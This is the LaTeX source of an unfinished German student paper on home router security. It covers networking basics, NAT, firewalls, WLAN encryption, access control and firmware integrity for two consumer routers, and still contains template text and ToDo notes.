\input{tex/pre} % Ausgelagerte Präambel

% Hier können die Informationen über die Ausarbeitung eingetragen werden
\newcommand*{\Course}{Sichere Hardware} % Bei vorlesungsbegleitenden Ausarbeitungen
\newcommand*{\Subject}{Router Schwachstellen}
\newcommand*{\Author}{Johanna Frech, Rebecca Schäfer}
\newcommand*{\Matriculation}{3006985, 3007203}
\newcommand*{\Discipline}{Informatik IT-Sicherheit}
\newcommand*{\Semester}{4}
\newcommand*{\Professor}{Prof. Roland Hellmann}
\newcommand*{\Deadline}{17.07.2026}
\newcommand*{\Location}{HS Aalen}

% Um die Übersetzung zu beschleunigen, kann man hiermit nur Teile der Ausarbeitung übersetzen lassen
% \includeonly{FILENAME,FILENAME,...}

% Die folgenden Zeilen können für die Druckausgabe verwendet werden
% Achtung: Durch den vergrößerten Textbereich kann eine erneute Optimierung der Zeilenumbrüche
% notwendig sein.
% \KOMAoptions{BCOR     = 0mm,       % Hier die durchschnittliche Länge eintragen, die durch die
	%                                    % Bindung verloren geht
	%              DIV      = 11,        % Vergrößerter Textbereich für die Druckausgabe
	%              headings = openright, % Kapitel starten immer auf der rechten Seite
	%              twoside}
% \ofoot*{\pagemark}
% \ifoot*{}
% \renewcommand*{\Signature}{\rule{6cm}{1pt}\\Unterschrift}

% Metadaten für das PDF
\hypersetup{%
	pdfinfo={%
		Author={\Author\ (Matrikelnummer: \Matriculation)},
		Title={\Subject},
		Subject={\Course},
		Keywords={\Course, \Course, \Author, \Discipline, \Professor}
	}
}

\begin{document}
	\include{tex/titlepage}      % Titelseite
	\include{tex/eidesstattlich} % Eidesstattliche Erklärung
	
	% Hier eigene Kapitel einfügen
	
	\chapter*{Kurzfassung}
	Ziel der Kurzfassung ist es, einen (eiligen) Leser zu informieren, so dass
	dieser entscheiden kann, ob die Arbeit für ihn hilfreich ist oder nicht
	(neudeutsch: Management Summary).                        
	Die Kurzfassung gibt daher eine kurze Darstellung
	\begin{itemize}
		\item{des in der Arbeit angegangenen Problems}
		\item{der verwendeten Methode(n)}
		\item{des in der Arbeit erzielten Fortschritts}
	\end{itemize}
	
	Dabei sollte nicht auf die Struktur der Arbeit eingegangen werden, also Kapitel
	2 etc. denn die Kurzfassung soll ja gerade das Wichtigste der Arbeit vermitteln,
	ohne dass diese gelesen werden muss. Eine Kapitelbezogene Darstellung sollte
	sich in Kapitel 1 unter Vorgehen befinden.
	
	Länge: Maximal 1 Seite.
	
	\include{tex/frontmatter}    % Verzeichnisse, Vorbereitung Layout eigene Kapitel
	
	
	\chapter*{Abbildungsverzeichnis}
	Abbildung 1: Vorgehen nach (1)
	\newpage
	
	\chapter*{Abbildungsverzeichnis}
	Tabelle 1: Testtabelle
	\newpage
	
	\chapter*{Abkürzungssverzeichnis}
	\newpage
	
	\chapter{Einleitung}
	Die Einleitung dient dazu, beim Leser Interesse für das Thema der Arbeit zu
	wecken, das behandelte Problem aufzuzeigen und den zu seiner Lösung
	eingeschlagenen Weg zu beschreiben.
	\section{Motivation}
	In der Motivation wird dargestellt, wieso es notwendig ist, sich mit dem in der
	Arbeit identifizierten und behandelten Problem zu beschäftigen.

	Das Thema Router ist für die meisten Personen sehr relevant, da fast jeder ein 
	solches Gerät zu Hause hat, es täglich nutzt und damit nicht nur unproblematische
	Dinge macht, wie bsp. Bilder von einem PC zu einem Tablet zu senden sonder auch
	persönliche oder gar geheime Daten über das Internet übermittelt. Die meisten
	Personen denken hierbei erst einmal an persönliche Daten wie die Adresse oder 
	die Bankdaten, aber auch geheime Dokumente, die während dem Home Office versendet
	werden, werden über den Router übertragen. Durch eine unsichere Einrichtung des
	Router können massive Schwachstellen entstehen, die Angreifer ausnutzen können.
	%---Quelle: But is it exploitable
	%Chapter 1, p.277 -> Covid Pandemi
	%G. Chalhoub and A. Martin. "But is it exploitable? Exploring how Router Vendors Manage and Patch Security Vulnerabilities in Consumer-Grade Routers" in EuroUSEC '23: Proceedings of the 2023 European Symposium on Usable Security, 2023, pp. 277-295

	\section{Problemstellung und -abgrenzung}
	Die Problemstellung beginnt mit der Einordnung in ein thematisches Umfeld und
	enthält sowohl die in der Arbeit angegangenen Problempunkte, als auch weitere,
	nicht behandelte Problempunkte. Eine Negativabgrenzung verhindert, dass beim
	Leser später nicht erfüllte Erwartungen geweckt werden.
	Hier vielleicht rein, dass nicht auf das ISO/OSI Modell eingegangen wird, 
	da es für die Arbeit als Wissen vorausgesetzt wird.
	\section{Ziel der Arbeit}
	Mit dem Ziel der Arbeit wird der angestrebte Lösungsansatz festgelegt. An 
	diesem Ziel wird die Arbeit gemessen.Mit dem Ziel der Arbeit wird der 
	angestrebte Lösungsansatz festgelegt.

	Ziel der Arbeit ist es dem Leser die Wichtigkeit der Umsetzung von sicheren
	Einstellungen und der damit verbundenen Sicherheit des eigenen Netzwerks
	zu Hause und der Kommunikation ins Internet darzulegen. Zudem soll die Arbeit
	beweisen, dass bereits simple Änderungen der Einstellungen, die Sicherheit
	massiv verbessern können. Hierzu werden schrittweise die Sicherheitseinstellungen
	erhöht und jeweils ein Vorher- Nachher Vergleich gemacht, die darstellen
	sollen welchen Einfluss die getätigten Einstellungen haben.
	%=======================notes jf - need to be deleted later
	%viell. noch hinzu: Zudem soll diese Arbeit das Verständis gegenüber dem
	%Umgang mit öffentlichen WLAN Zugängen schärfen, um im Alltag sicher auch
	%diese sicher zu nutzen
	%=========================================================
	
	\section{Vorgehen}
	Nachdem mit Problemstellung und Ziel gewissermaßen Anfangs- und Endpunkt der
	Arbeit beschrieben sind, wird hier der zur Erreichung des Ziels eingeschlagene
	Weg vorgestellt. Dazu werden typischerweise die folgenden Kapitel und ihr 
	Beitrag zur Erreichung des Ziels der Arbeit kurz beschrieben. Die folgenden 
	Kapitel sind ein – möglicher – Aufbau, Abweichungen können durchaus notwendig
	sein. Zur Darstellung des Vorgehens kann eine grafische Darstellung sinnvoll
	sein, bei der die einzelnen Lösungsschritte und ihr Zusammenhang dargestellt 
	werden. Ein Beispiel hierfür findet sich in \hyperlink{Abbildung1}{Abbildung1}.
	
	\newpage
	\begin{figure}[h]
		\centering
		\hypertarget{Abbildung1}{}
		\includegraphics{img/Abbildung1.png}
		\caption{Vorgehen nach \protect \hyperlink{[1]}{[1]}}
	\end{figure}
	\newpage
	
	\chapter{Grundlagen}
	In diesem Kapitel werden für die weitere Arbeit wichtige Begriffe eingeführt. 
	Dabei ist darauf zu achten, nur solche Inhalte in das Grundlagenkapitel 
	aufzunehmen, die später auch verwendet werden (Problembezogenheit). Ebenso
	ist auf eine ausreichend tiefe und vollständige Darstellung der Grundlagen
	zu achten.
	\newline \newline
	Für die Erstellung des Literaturverzeichnisses wird das Werkzeug Zotero 
	\href{www.zotero.org}{www.zotero.org} verwendet. Das Literaturverzeichnis in 
	dieser Vorlage wurde mit Zotero gemäß dem IEEE Format erstellt. 
	\newline \newline
	Hilfreich kann der Vergleich von Definitionen mit Hilfe einer Tabelle sein, 
	wie in \hyperlink{tabelle1}{Tabelle 1} dargestellt.
	\newline
	\begin{figure}[h]
		\hypertarget{tabelle1}{}
		\begin{tabularx}{\columnwidth}{|X|X|}
			\hline
			Endgerät & Geräte, die an einem Router angeschlossen sein können. Dazu zählen
			Laptops, Desktop PCs, Server, Drucker, Smartphone, etc.\\ %---muss das rein?
			\hline
			Netzwerk & ... \\
			\hline
			Netzwerksegment & ... \\
			\hline
			LAN & local area network - lokales Netzwerk \\
			\hline
			WAN & wide area network - Internet \\
			\hline
			Schicht / Layer & Schicht im ISO/OSI Referenzmodell, welches die Übertragung
			von Daten vom Kabel bis hin zur Darstellung auf dem Endgerät beschreibt. \\
			\hline
			Pakete & Pakete, die Informationen und Daten enthalten, die von einer 
			Quelle, zum Beispiel einem Laptop an ein Ziel, beispielsweise ein Desktop PC
			weitergeleitet werden. Über diese Pakete wird in Schicht 3 des ISO/OSI Modells
			kommuniziert.\\
			\hline
			Frames & Rahmen, die die Inforamtionen und Daten enthalten, die übermittelt
			werden sollen. Über diese Rahmen wird in Schicht 2 des ISO/OSI Modells
			kommuniziert. Rahmen und Pakete unterscheiden sich nur durch die jeweilige
			Schicht, beide enthalten die zur übertragenend Informationen. Lediglich
			die Benennung ist unterschiedlich in der Schicht.\\
			\hline
			Protokolle & Richtlinien zu einem Vorgehen, dass kann die Art und Weiße sein
			wie Pakete übermittelt werden oder auch welchen Weg ein Paket innerhalb eines
			Netzwerkes nehmen soll\\
			\hline
		\end{tabularx}
		\caption{Testtabelle}
	\end{figure}
	\section{Router Grundlagen}
	%=======================notes jf - need to be deleted later
	%was ein Router ist, wie er funktioniert, welche Arten es gibt, wie er aufgebaut
	%ist,und warum er sicherheitsrelevant ist.
	%
	%Grundlagen von Routern: Definition und Funktion, Routerarten, Aufbau und
	%Komponenten, Routing-Verfahren
	%
	%Gerät identifizieren → Netz strukturieren → lokal kommunizieren → zwischen
	%Netzen kommunizieren → physische/verbindungstechnische Umsetzung
	%=========================================================
	Wie der Name erahnen lässt ist der Router innerhalb eines Netzwerks dafür
	zuständig Nachrichten von einer angeschlossenen Quelle zum Ziel zu leiten.
	Der Router kümmert sich darum, dass der optimale Weg von der Quelle zum Ziel 
	gefunden wird. Welcher Pfad gewählt wird hängt von den Protokollen ab,
	es kann der schnellste Weg genutzt werden oder auch eine definierte Route
	über verschiedene Punkte. Es gibt zwei Arten des Routing, dynamisches und 
	statisches Routing. Auf diese Arten und die Protokolle wird im Abschnitt
	\ref{sec:Routing-Arten} weiter eingegangen.
	%---wird über Protokolle festgelegt -> nochmal weiter darauf eingehen	
	Wichtig zu Beachten ist der Unterschied zwischen Router und Switch. Beide
	Geräte sind für die Weiterleitung der Pakete an das richtige Ziel zuständig.
	Die Switches der Schicht 2 (ISO/OSI Modell) können nur Frames innerhalb 
	eines lokalen Netzwerks, das heißt der Adressbereich hat eine gewisse
	Beschränkung weiterleiten. Diese können nicht über Netzwerkgrenzen, also
	in eine lokales Netzwerk mit anderem Adressbereich, als dem Quellnetzwerk
	kommunizieren. Switches der Schicht 3 können über Netzwerkgrenzen hinweg
	Pakete versenden. Der Hauptunterschied zwischen Switches und Routern ist
	daher, dass der Router nicht nur über Netzwerkgrenzen hinweg Pakete 
	leiten kann sonder das er aus dem LAN auch in das WAN, besser bekannt als
	das Internet Pakete versenden kann.
	%---Quelle: C.Baun. Computernetze kompakt. Wiesbaden, D: Springer Vieweg, 2025, pp. 149-150
	
	\subsection{Netzwerksegmente und IPv4}
	Die Segmentierung eines Netzwerk ist dann sinnvoll, wenn es
	sich um eine große Infrastruktur, wie die eines Unternehmen handelt. Die 
	Subnetze besitzen einen logischen Adressraum, der abhängig von der Anzahl an 
	Geräten ist, die in diesem Netzwerk sein sollen. 
	Um zu verstehen, wie eine Segmentierung funktioniert, muss zuerst der Aufbau
	der Adresse verstanden werden. Eine Adresse ist in diesem Fall die IP-Adresse,
	wobei IP für Internet Protocol steht. In dieser Ausarbeitung wird nur mit
	IPv4 Adressen gearbeitet, weshalb nicht näher auf die IPv6 Adressen 
	eingegangen wird. Eine IPv4 Adresse besteht aus 4 Teilen, die durch einen 
	Punkt von einander getrennt sind. Jeder Teil beinhaltet eine Zahl zwischen 0
	und 255, daraus ergibt sich eine Größe von 32 Bit, was wiederum 4Byte 
	entspricht. Um in einem Subnetz kommunizieren zu können haben alle
	sich darin befindenden Geräte in ihrer IP-Adresse den gleichen Netzwerkanteil.
	Das exakte Geräte innerhalb des Subnetz ist im Hostanteil der IP-Adresse zu
	finden. Diese muss zwingend einzigartig im jeweiligen Subnetz sein, da es
	sonst zu Konflikten kommt. Hätten zwei Geräte die gleiche IP-Adresse kann der
	Router nicht entscheiden an welches, das entsprechende Paket weiter gleitet
	werden muss. Der Hostanteil nimmt entsprechend der Größe des Subnetzes mehr
	Bits der IP-Adresse ein. Die Größe des Anteils kategorisiert das Netz in die
	Klassen A bis C siehe folgende Abbildung \ref{fig:nwclasses}.
	\begin{figure}[H]
		\centering
		\includegraphics[width=\textwidth]{img/c-nw_nwklassen_s93.png}
		\caption{Host- und Netzwerkanteil je Netzwerkklasse \protect \hyperlink{[2]}{[2]}}
		\label{fig:nwclasses}
	\end{figure}
	Ob ein sich Quelle und Ziel im gleichen Subnetz befinden, wird vom Sender, also
	der Quelle bestimmt. Mit Hilfe der Subnetzmaske wird die IP-Adresse des Senders
	logisch UND verknüpt. Das gleiche wird mit der Ziel-IP-Adresse gemacht. Kommt bei
	beiden Rechnungen das gleiche Ergebnis heraus, sidn beide Teilnehmer im gleichen
	Subnetz und können somit über Layer 2, also mit Hilfe vom MAC-Adressen, die Frames
	austauschen. Wird ein Paket innerhalb es gleichen LAN versendet, wird mit der MAC-Adresse
	gearbeitet. Der Sender hat eine sogenannte ARP Tabelle (Adress Resolution Protocol)
	in der die Geräte, an die der Sender bereits ein Frame gesendet hat enthalten
	sind. Es sind die IP-Adressen und die dazugehörige MAC-Adresse enthalten. Diese
	Informationen werden dann in der Tabelle gespeichert, nach einer konfigurierte
	Zeit gelöscht und müssen dann bei erneutem Senden an den Empfänger wieder 
	angefragt und gespeichert werden. Um die MAC-Adresse des Empfängers zu ermitteln
	sendet der Sender eine ARP-Anfrage in das lokale Netz. Diese Anfrage wird an alle 
	Geräte im Netz gesendet, der sogenannte Broadcast. Das Gerät welches die
	gesuchte IP-Adresse hat antwortet mit seiner MAC-Adresse. Der Sender erhält die
	Adresse und sendet dann den Frame an die MAC-Adresse innerhalb des lokalen
	Netzwerks.
	Befinden sich die Geräte nicht im gleichen Subnetzt, ist das Ergebnis der 
	Berechnung mit der Subnetzmaskeverschieden 
	und es muss über Layer 3, mit Hilfe der IP-Adressen und dem Router das Paket 
	versendet werden. Dafür wird das Paket an die IP-Adresse des Routers gesende,
	auch bekannt als Gateway. Die Routing-Tabelle wird für die Kommunikation genutzt, 
	um heraus zufinden über welchen Port das Paket weitergeleitet werden muss. 
	Da der Router ein Layer 3 Gerät ist, muss er die IP-Adresse des Zielgerätes
	kennen, um das Paket in das richtige Netzwerk zu leiten. Die Tabelle beinhaltet
	alle Netzwerke, die über einen Port am Router angeschlossen sind. Wie bereits 
	erwähnt lässt sich das Subnetz über IP und Subnetzmaske berechnen, dadurch
	weiß der Router in welches Subnetz das Paket gesendet werden muss. Er leitet
	es in das entsprechende Subnetz, wo es dann wieder mit der MAC-Adresse an das 
	Zielgerät geleitet wird.
	In der folgenden Abbildung \ref{fig:subnetmask} sind zwei Rechnungen mit 
	Subnetzmaske zu sehen, die einmal zeigen, dass sich Quelle und Ziel im 
	gleichen Subnetz befinden und das andere Beispiel zeigt, dass sie in 
	unterschiedlichen Subnetzen sind.
	\begin{figure}[H]
		\centering
		\includegraphics[width=\textwidth]{img/subnetmask_calculation_pic.pdf}
		\caption{Subnetzberechnung}
		\label{fig:subnetmask}
	\end{figure}
	%---Quelle: 
	%Computer-Netzwerke, H.Zisler, 2022; Coputernetze kompakt, C.Baun, 2025 Kapitel 7.6

	\subsection{Kommunikation von LAN in WAN}
	%---Modem und wie komm ich ins Internet
	Ein Router hat heutzutage ein eingebautes Modem, das ihm ermöglicht Pakete,
	ins Internet zu senden als auch zu empfangen. Ohne ein solches Modem ist
	die Kommunikation ins Internet nicht möglich. Das Modem wandelt die digitalen
	Signale von einem Endgerät, wie einem Laptop in analoge Signale um und sendet
	dann die Anfrage in das Internet. Die Antwort ist ein analoges Signal welches
	wiederum in ein digitales gewandelt werden muss, damit der Laptop die 
	enthaltenen Informationen verarbeiten kann.
	Um zu wissen wohin ein Paket muss, untersucht der Router das angekommene Paket.
	Es enthält sowohl die Quell-, als auch die Zieladresse anhand derer der Router
	entscheiden kann, ob das Ziel eins der Geräte ist, die mit ihm verbunden sind
	oder ob das Paket weitergereicht werden muss an den nächsten Switch oder 
	Router. 
	%---
	%---Bild grober Paketaufbau + Abbildungsnummer unten in Text
	%---
	Wie in der Abbildung XY zu sehen besteht ein Paket aus einem Header, den
	Nutzdaten und einer Prüfsumme. Die Ziel-Adresse steht gefolgt von der Quell-
	Adresse im Header des Pakets. Die Adressen sind die oben beschriebenen IP-
	Adressen. 
	\subsection{Router Aufbau und Verbindungsarten}
	Die Beschreibung des Aufbau eines Routers wird in dieser Ausarbeitung auf
	die Komponenten beschränkt, die die beiden Router haben, die für die Tests
	verwendet werden. Es handelt sich dabei um folgende Geräte, die für den
	Gebrauch im eigenen Zuhause geeignet sind:
	\begin{description}
		\item[WRT120] Wireless-N Home Router, Hersteller: Linksys by Cisco
		\item[DIR-600] Wireless N 150 Home Router, Hersteller: D-Link
	\end{description}
	Es wird vorallem auf die Anschlüsse eingegangen und die Möglichkeiten 
	die Verbindung zum Internet herzustellen. Etwaige interne Hardwarekomponenten
	werden nur beschrieben, wenn diese eine mögliche Schwachstelle darstellen,
	die von außerhalb von einem Angreifer ausgenutzt werden kann.
	An der Rückseite der Router befinden sich die Ports, Resetbutton zum 
	zurücksetzen auf Werkseinstellungen, Internet-Port als auch der Anschluss
	für die Stromversorgung.
	Beide Router werden über den Internet Port mit einem Ethernet Kabel an das 
	eigene Netz entweder per Kabel- oder DSL-Internetverbindung angeschlossen.
	Über die 4 weiteren Ports werden Geräte im lokalen Netz direkt mit dem 
	Router verbunden. Weitere Geräte können per WLAN mit den Routern verbunden
	werden. Dabei stellt die Verbindung über WLAN die größte Schwachstelle dar,
	da man für diesen Zugang nicht physisch direkt am Router sein muss. Daher
	ist es sehr wichtig die Standardpasswwörter als auch den Namen des Router
	bei der Ersteinrichtung zu ändern. Damit kann verhindert werden, dass ein 
	Angreifer erstens herausfindet welchen Router man nutzt, da dies meist der
	Default Name des Router ist und daraus dann per Websuche das Datenblatt
	findet indem dann die Default Anmeldedaten zu finden sind. In der folgenden
	Abbildung \ref{fig:wrt120n-ports} ist die Rückseite des WSR120N von Linksys
	zu sehen.
	\begin{figure}[H]
		\centering
		\includegraphics[width=\textwidth]{img/wrt120n_ports-benutzerhandbuch_s1.png}
		\caption{WRT120N Anschlüsse hinten}
		\label{fig:wrt120n-ports}
	\end{figure}
	Wurde das WLAN mit Hilfe der Anleitung eingerichtet sind die Router nicht
	nur sichtbar als WLAN Provider sondern können nach erfolgreicher Verbindung
	auch eine stabile Internet Verbindung bieten.
	%---Quelle: Datenblätter der Router
	%User Guide in differente languages, downloaded: 16.05.2026
	%https://downloads.linksys.com/downloads/userguide/1224697214905/WRT120N-EMEA_combo_UG.pdf
	%Datasheet, downloaded: 18.05.2026
	%https://www.dlink.com/al/sq/-/media/consumer_products/dir/dir-600/datasheet/dir_600_c1_datasheet_03_ww.pdf

	%=======================notes jf - need to be deleted later
	% ich wusste nicht worein damit, vielleicht nachher in Tipps
	% oder an was man selbst denken soll für eine sichere
	% Nutzung von Routern daheim
	%=========================================================
	Die Nutzung eines Routers daheim ist für die meisten Personen unabdingbar
	und gerades deshalb sollten die Anweisungen der Routerhersteller umgesetzt
	werden. Dies stellt sich auf als nicht immer umsetzbar raus, da viele User
	nicht die technischen Kenntnisse haben diese Anweisungen umzusetzen $To-Do:Quelle hier$.
	Um Angriffe wie in Abschnitt $ToDo:so und so$ zu vermeiden können als erster
	Schritt die Punkte 1 bis 4 aus der Handbuch von WRT120N umgesetzt werden.
	Die folgenden Tests zeigen, dass das einfache Eindringen in System mit
	diesen Handgriffen bereits verhindert wurde $ToDo: hier Tests für ins WLAN
	kommen mit Standardpw und so weiter$
	%---Quelle: But is it exploitable
	%Chapter 4.4, pp. 284-285
	%G. Chalhoub and A. Martin. "But is it exploitable? Exploring how Router Vendors Manage and Patch Security Vulnerabilities in Consumer-Grade Routers" in EuroUSEC '23: Proceedings of the 2023 European Symposium on Usable Security, 2023, pp. 277-295
	%User Guide in differente languages, downloaded: 16.05.2026
	%https://downloads.linksys.com/downloads/userguide/1224697214905/WRT120N-EMEA_combo_UG.pdf

	\subsection{Routing Arten}
	\label{sec:Routing-Arten}
	Arten von Routing, jeweils mit Vor-/Nachteilen und Einsatzgebiet
	Unterschiede von Routern in Heimnetzen und Unternehmen
	\subsection{Definition AB}


	\section{Sicherheitsmechanismen im Router}
	\subsection{Adressverbergung(NAT - RFC 30022)}
	\label{sec:Adressverbergung(NAT - RFC 30022)}
	%--------------------------------------------------------------------------------%
	%-----------Nochmal überarbeiten----formulierung und rechtschreibung anpassen----%
	Networke Address Translation(NAT) ist ein Mechanismus, bei dem der Router interne 
	IP-Adressen eines lokalen Netztwerks (LAN) in eien öffentliche IP-Adresse übersetzt.
	Es gibt welweit ca 4 Millarden public IPv4 Adressen, sie sind also begrenzt
	Private Adressen werden nur innerhalb eines lokalen Netztwerks genutzt von den Geräten.
	Haushalte oder Frimen haben alle eine private IP Adresse mit der sie mit dem Router verbunden sind.
	Der Router wiederum hat eine public IP Adresse, und hat somit zugriff auf das Internet.
	Über den Router können so alle Geräte auf das Internet zugreifen.
	NAT übersetzet also ein Satzt von IP AdrAessen zu einem anderen Satz an IP-Adressen.
	Es übersetzet also von Privat zu Public aber auch andersherum

	NAT selbst ist nicht offiziel ein Sicherheitsmechanismen, kann aber also solcher intepretiert werden
	Den Aufgrund der übersetetzung mehrerer lokaler IP-Adressen zu eine publizierten kann von
	außen nicht festgestellt werden, wie das betrachetet Netztwerk intern aufgebaut ist
	oder wie viele sich in ihm befinden. Zudem ist keine direkte verbindung von außerhalb mit
	den Geräten möglich solange dies nicht explizit erlaubt wird.

	NAT bietet eine impllizite Schutzwirkung, aber keine echte Sicherheit im klasischen Sinne.
	Nicht angeforderte verbindungen werden blockiert, die Angriffsfläche wird reduziert und Geräte können
	nicht direkt adressiert werden. 
	%Quelle(https://www.rfc-editor.org/rfc/rfc3022)%

	\subsection{Paketfilterung und Stateful Firewalls}
	\label{sec:Paketfilterung und Stateful Firewalls}
	Eine Firewall schützt ein netztwerk vor bedrohungen, in dem sie den Datenverkehr kontrolliert.
	- zustandbehaftete(Stateful) und zustandlose(Statless) FWs
	- ersteres eher die Norm, wei besser
	Statless:
	- älter
	- verlässt dich auf Zugriffskontrolliste beim Filtern
	- entscheidung auf grundlage von Paket infos
	- speichern keine infos über status oder kontext der verbindung
	- überprüft Quell- und Ziel-IP-Adresse, Portnummer und den verkehrstyp im Header
	- Filterung nur so gut wie vom nutzer definierte -> müssen gescheit verwaltet werden
	- weniger ressourcen und schneller -> gut bei hohem Datenverkehr
	- wird heute vorallem dazu verwendet die last der staful firewall zu verringern
	- bekannte IP-Adressen blocken, geographische Regionen
	- ist nur so gut wie der Netzwerkadmin (Benutzerfehler)
	Stateles Firewalls gehören zu den älteren Modellen und werden heute nur noch unter bestimmten
	vorraussetzungen verwendet. Sie verwenden eine Zugriffskontrolliste beim filtern und treffen 
	entscheidungen auf grundlage von Paket Informationen. Allerdings speichert eine Stateful Firewall
	nicht den Status oder den Kontet der Verbindung Sie überprüft die Quell und Ziel-IP-Adresse
	die Portnummer und den Verkehrstyp im Header. Die Filterung des Pakete funktioniert nur so gut,
	wie sie konfiguriert wurde, und hängt somit fast vollständig von dem Netzwerkadministrator selbst ab.
	Vorteilhaft ist ihr geringer ressourcen Verbaruch und ihre Fähigkeit Daten schnell zu verarbeit,
	was vorallem bei hohem Datenverkehr wichtig ist. Heutzutage wird sie vorallem verwendet um 
	die Last der Stateful Firewall zu verringern.

	Stateful:
	- überwachen Datenpackete und den Kontext ders Datenverkehrs
	- verstehen den kontext von NW verbindungen
	- dynamische Paketflterung
	- Quell und Ziel IP Erfassung
	- können Bewegung von Daten im ganzen Netztwerk überwachen
	- durch Zustandstabelle -> entscheidung daruf basierend in der Zukunft
	- sind anfällig für DDoS und Man in the Middle, wenn Code nicht auf neustem Stand
	- auflistung der Eigenschaften

	\subsection{WLAN-Verschlüsselung}
	\label{sec:WLAN-Verschlüsselung}
	Bei der WLAN-verschlüsselung wird die Funkkommunikation zwischen dem Endgerät und dem 
	Access-Point abgesichert.
	- basiert auf IEEE-blabla und IEE blavla (für WPA3)
	- jedes Gerät in Reichweite kann den Datenverkehr mithören
	- durch verschlüsselung wird das verhindert
	Für WPA2 muss eine Verschlüsselung durch AES-CCMP (Counter Mode with CBC\_MAC Protokoll) gegeben sein.
	CCMP ist ein Sicherheitsstandart gemäß IEEE 802.1. Hierbei werden verschiedene kryptographische
	Algorithmen verwendet, CCMP ist der Mechnismus zur Integritätssicherung, verschlüsselung und Authentifizierung 
	Das Verfahren Nutzt einen 128 Bit langen Schlüssel in kombination mit einem 48 Bit langem Initialisierungsvektor,
	Das Verfahren basiert auf Advanced Encryption Standart (AES).
	- AES sorgt für starke symmetrische Verschlüsselung
	- CCMP = Verschlüsselung und Integritätsprüfung
	- Daten sind dann gegen Lesen und Manipulation geschützt
	- Sitzungsschlüssel aushandeln (Genau beschreibung hier noch machen!!!!)
	- Schwachstellen: schwache Passwörter, KRACK-Angriffe (wtf?), Schlüssel wiederverwenden

	WPA3:
	-Weiterentwicklung von WPA2
	- kein Sitzungsschlüssel sondern WPA3 SAE(Dragonfly Handshake) -> (noch beschreiben!!!)
	- Foward Security = selbst bei passwort entschlüsselung können daten nicht etschlüsselt werden
	- OWE (Opportunistic Wireless Encryption)
	-  -> offene WLANs sind auch verschlüsselt auch ohne PW 
	%---Quelle(https://csrc.nist.rip/external/nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-153.pdf)---%

	\subsection{Zugriffskontrolle}
	\label{sec:Zugriffskontrolle}
	Da der Router einen zentralen Bestandteil der Netzwerkinfrastruktur darstellt, muss der administrative
	Zugriff besonders geschütz werden.
	Zur absicherung des administrativen Zugriffs werden Authentifizierungsmechanismen eingesetzt.
	Üblicherweise erfolgt dies über einen Benutztername und ein Passwort. 
	Moderne Router unterstützten zusätzlich eine Mehrfaktorauthentifizierung sowie rollenbasierte Accounts, 
	also die Aufteilung in Admin sowie eingeschränkte Nutzter.
	Besonders wichtig ist es, ein starkes Passwort zu nutzten, sowie die Standartzugangsdaten zu ändern.
	
	Darüber hinaus sollte der Zugriff auf vertrauenswürdige Netzwerke beschränkt werden
	Häufig wird der Zugriff ausschließlich aus dem Lokal Area Networke (LAN) erlaubt. 
	Der Remote Administrator wird entweder deaktiviert oder stark eingeschränkt werden. 
	Dies reduziert die Angriffsfläche erheblich, da das Webinterface nicht öffentlich Erreichbar ist.

	Desweiteren sollten unsichere Verwaltungsprotokolle wie HTTP und Telnet deaktiviert werden,
	da diese Daten unverschlüsselt übertragen. Stattdessen sollten HTTPS und SSH verwendet werden.

	Neben dem administrativen Zugriff spielt auch die Zugriffskontrolle im Netzwerkverkehr eine bedeutente Rolle.
	Router und Firewall kontrollieren hierbei welcher Netzwerkverkehr erlaubt oder blockiert wird.
	Die zentrale Sicherheitskomponente ist die Stateful Firewall. 
	Diese überwacht aktive Verbindungen und erlaubt nur etablierte oder explizit erlaubte Packete
	und blockiert unerwünschte eingehende Packete. Außerdem kann sie eigene Regeln definieren.

	Die Access Controle Lists (ACLs) wird vorallem in Modernen und professionellen Routern genutzt.
	Mit ihr kann granular definiert werden welche IP-Adressen kommunizieren dürfen, welche protokolle erlaubt sind
	und welche Ports genutzt werden dürfen.
	Dadurch kann der Netztwerkverkehr gezielt kontrolliert und eingeschränkt werden.

	Eine weitere Zugriffskontrolle bietet die Netztwerksegmentierung. Moderne Router ermöglichen die Einrichtung 
	seperater Netztbereiche beispielsweise durch das anlegen eines Gastnetzwerks und VLANs. 
	Dadurch können Geräte sowie Benutztergruppen voneinander getrennt werden, wodurch die Ausbreitung eines Angriffs beschränkt wird.
	Zusätzlich können Router als VPNB-Endpunkte fungieren. 
	Der Zugriff erfolgt dann über einen verschlüsselten und authentifizierten Tunnel,
	wodurch der Zugriff auf den Router aus externen Netztwerken abgesichert ist. 

	In der Praxis ist die Zugriffskontrolle selbst oftmals weniger das Problem, sondern ihre Fehlkonfiguration.
	Wenn beispielsweise Standartpasswörter nicht geändert werden, der Remote-Admin offen ist, unötige Ports
	freigegeben werden oder unsichere Protokolle aktiviert sind, führt dies dazu das theoretisch vorhandene
	Mechanismen wirkungslos sind.

	%---Quelle(https://nvlpubs.nist.gov/nistpubs/Legac019-16920: y/SP/nistspecialpublication800-41r1.pdf)---%
	%---Quelle(https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-44ver2.pdf)---%
	
	\subsection{Firmware Integrität}
	\label{sec:Firmware Integrität}
	Die Firmware Integrität beschreibt die Eigenschaft eines Routers, sicherzustellen, dass die auf dem
	Gerät laufende Firmware unverändert, authentisch und vertrauenswürdig ist. Dies ist ein zentraler
	Sicherheitsmechanismus, da die Firmware ein kritischer bestandteil der Gesamtarchitektur ist.
	Die Firmware ist das eingebette Betriebssystem des Routers. 
	Eine Kompromittierung der Firmware erlaubt es Angreifern vollständige kontrolle über das
	gesamte Gerät zu erlangen, einschließlich der Manipulation der Netztwerkverkehrs, der Umgehung
 	von Sicherheitsmechanismen wie der Firewall sowie der Etablierung persistenter Schadsoftware.
	Zur sicherstellung der Integrität wird in der Regel eine kryptographische Signaturprüfung eingesetzt.
	Der Hersteller des Routers signiert jedes Firware-Update.
	Ablauf:
	\begin{itemize}
		\item{Hersteller erzeugt Firmware}
		\item{Firmware wird kryptographisch signiert (Private Key)}
		\item{Router prüft beim Update die Signatur (Publlic Key im Gerät)}
	\end{itemize}
	Falls das Update ungültig ist wird es abgelehnt.
	Ein weiterer Sicherheitsmechanismus ist der Secure Boot der den Router während des Startvorgangs schützt.
	Beim Booten wird zuerst ein Bootlader geladen. Dieser prüft dann die Signatur der Firmware und startet sie nur dann,
	wenn die prüfung positiv ausfählt. Andersnfalls lässt sich das Gerät nicht starten oder geht in den
	Recovery-Modus. Dies stellt sicher, das keine dauerhaft kompromittierte Firmware geladen wird.
